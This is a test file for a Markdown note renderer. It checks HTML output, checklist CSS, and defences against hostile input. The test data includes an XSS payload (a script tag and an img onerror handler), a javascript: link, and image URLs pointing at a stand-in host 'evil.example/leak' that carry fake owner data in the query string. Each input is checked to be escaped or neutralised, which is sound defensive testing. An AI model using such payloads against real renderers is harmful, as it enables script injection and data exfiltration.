import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { extractMain, renderNoteHtml } from "./renderMarkdown";

const styles = readFileSync(new URL("./notes.css", import.meta.url), "utf8");

describe("note renderer", () => {
  test("renders Markdown to the inner HTML of main.fmd", async () => {
    const html = await renderNoteHtml("# Hi\n\n- **0:20** first\n- [ ] todo\n");
    expect(html).toContain("<h1");
    expect(html).toContain("<strong>0:20</strong>");
    expect(html).toContain('<li class="task">');
    expect(html).not.toContain("<main");
    expect(html).not.toContain("<style");
  });

  test("keeps formatted checklist prose in one inline text flow", async () => {
    const html = await renderNoteHtml("- [ ] move **important** and _italic_ words\n");
    expect(html).toContain('move <strong>important</strong> and <em>italic</em> words</li>');
    expect(styles).toMatch(/\.soft-skin \.fmd li\.task\s*\{[^}]*position:\s*relative;[^}]*padding-left:\s*1\.5em;/s);
    expect(styles).toMatch(/\.soft-skin \.fmd li\.task input\s*\{[^}]*position:\s*absolute;/s);
    expect(styles).not.toMatch(/\.soft-skin \.fmd li\.task\s*\{[^}]*display:\s*flex;/s);
  });

  test("escapes raw HTML and drops javascript: links", async () => {
    const raw = await renderNoteHtml(
      "<script>alert(1)</script>\n\nhi <img src=x onerror=alert(1)>",
    );
    expect(raw).not.toContain("<script");
    expect(raw).not.toContain("<img");
    expect(raw).toContain("&lt;script&gt;");
    const link = await renderNoteHtml(
      "[x](javascript:alert(1)) and [y](https://a.b)",
    );
    expect(link).not.toContain("javascript:");
    expect(link).toContain('href="https://a.b"');
  });

  test("an image in a note never gets a source: it shows as its description and host", async () => {
    const html = await renderNoteHtml(
      [
        "![chart](https://evil.example/leak?d=FAKE-OWNER-DATA-1234)",
        "![ref image][r]",
        '[r]: https://evil.example:8443/ref?d=FAKE-OWNER-DATA-1234 "t"',
        "[![badge](https://evil.example/badge.png)](https://evil.example/target)",
        "![local](/own.png)",
      ].join("\n\n"),
    );
    expect(html).not.toMatch(/<(img|picture|source|video|iframe)\b/i);
    expect(html).not.toMatch(/\s(src|srcset|poster)=/i);
    expect(html).toContain("Image not loaded: chart (evil.example)<");
    expect(html).toContain("Image not loaded: ref image (evil.example:8443)<");
    expect(html).toContain("Image not loaded: badge (evil.example)<");
    expect(html).toContain("Image not loaded: local<");
    expect(html).not.toMatch(/url\(/i);
    expect(html).not.toContain("FAKE-OWNER-DATA-1234");
  });

  test("a link whose label already is its address says the host once", async () => {
    const html = await renderNoteHtml("see https://bare.example/a/b and [bare.example](https://bare.example)");
    expect(html).not.toContain("note-link-host");
  });

  test("a web link shows its full host beside the label", async () => {
    const html = await renderNoteHtml(
      "[docs](https://evil.example:8443/p?a=1&b=2) and [good.example](https://evil.example/x) and [mail](mailto:a@b.example)",
    );
    expect(html).toContain('href="https://evil.example:8443/p?a=1&amp;b=2">docs</a> <span class="note-link-host">(evil.example:8443)</span>');
    expect(html).toContain('>good.example</a> <span class="note-link-host">(evil.example)</span>');
    expect(html).toContain('>mail</a>');
    expect(html).not.toContain("(b.example)");
  });

  test("an output without main.fmd is an error, not an empty note", () => {
    expect(() => extractMain("<html></html>")).toThrow("main");
  });
});
